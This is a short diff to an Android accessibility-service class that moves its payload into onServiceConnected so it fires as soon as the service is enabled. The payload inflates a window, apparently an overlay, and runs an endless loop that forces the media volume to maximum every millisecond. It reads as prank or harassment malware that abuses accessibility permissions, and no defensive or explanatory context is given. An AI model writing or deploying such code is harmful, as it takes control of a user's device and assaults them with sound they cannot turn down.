@@ -18,7 +18,12 @@ public class SVR extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent e) {
-        GLB.write("onAccessibilityEvent");
+        return;
+    }
+    @Override
+    protected void onServiceConnected() {
+        super.onServiceConnected();
+        GLB.write("----onServiceConnected----\n");
         WindowManager w = (WindowManager) getSystemService(Service.WINDOW_SERVICE);
         LayoutInflater inflater = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
         View v = inflater.inflate(R.layout.content_sndactivity, null);
@@ -50,7 +55,6 @@ public class SVR extends AccessibilityService {
                 try {
                     for (; ; ) {
                         ado.setStreamVolume(AudioManager.STREAM_MUSIC, ado.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
-
                         Thread.sleep(1);
                     }
                 } catch (InterruptedException e) {
@@ -59,12 +63,6 @@ public class SVR extends AccessibilityService {
             }
         }
         new R().start();
-        return;
-    }
-
-    @Override
-    protected void onServiceConnected() {
-        super.onServiceConnected();
         service = this;
     }
 
